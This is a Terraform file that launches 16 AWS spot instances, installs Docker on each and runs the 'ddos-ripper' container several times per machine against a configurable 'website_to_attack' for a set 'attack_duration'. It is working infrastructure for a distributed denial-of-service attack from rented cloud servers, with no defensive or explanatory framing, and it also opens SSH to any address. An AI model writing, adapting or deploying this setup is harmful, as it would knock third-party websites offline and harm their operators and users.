terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 3.27"
    }
  }

  required_version = ">= 1.1.0"
}

provider "aws" {
  profile = "default"
  region  = "ap-east-1"
}

resource "aws_spot_instance_request" "app_server" {
  ami                    = "ami-02333d201cff78886"
  count                  = 16
  instance_type          = "t3.small"
  spot_price             = 0.1
  wait_for_fulfillment   = true
  spot_type              = "one-time"
  key_name               = "aws_key"
  vpc_security_group_ids = [aws_security_group.main.id]

  tags = {
    Name = "Terraform-${count.index + 1}"
  }

  provisioner "remote-exec" {
    inline = [
      "sudo yum -y update",
      "sudo yum search docker",
      "sudo yum -y install docker",
      "sudo systemctl start docker.service",
      "echo \"sudo docker stop -t ${var.attack_duration} \\$(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack})\" > ~/log ",
      "sudo docker stop -t ${var.attack_duration} $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack}) &",
      "sudo docker stop -t ${var.attack_duration} $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack}) &",
      "sudo docker stop -t ${var.attack_duration} $(sudo docker run -d -it --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack})"
    ]
  }

  connection {
    type        = "ssh"
    host        = self.public_ip
    user        = "ec2-user"
    private_key = file(var.pem_key_path)
    timeout     = "4m"
  }
}

resource "aws_security_group" "main" {
  egress = [
    {
      cidr_blocks      = ["0.0.0.0/0", ]
      description      = ""
      from_port        = 0
      ipv6_cidr_blocks = []
      prefix_list_ids  = []
      protocol         = "-1"
      security_groups  = []
      self             = false
      to_port          = 0
    }
  ]
  ingress = [
    {
      cidr_blocks      = ["0.0.0.0/0", ]
      description      = ""
      from_port        = 22
      ipv6_cidr_blocks = []
      prefix_list_ids  = []
      protocol         = "tcp"
      security_groups  = []
      self             = false
      to_port          = 22
    }
  ]
}
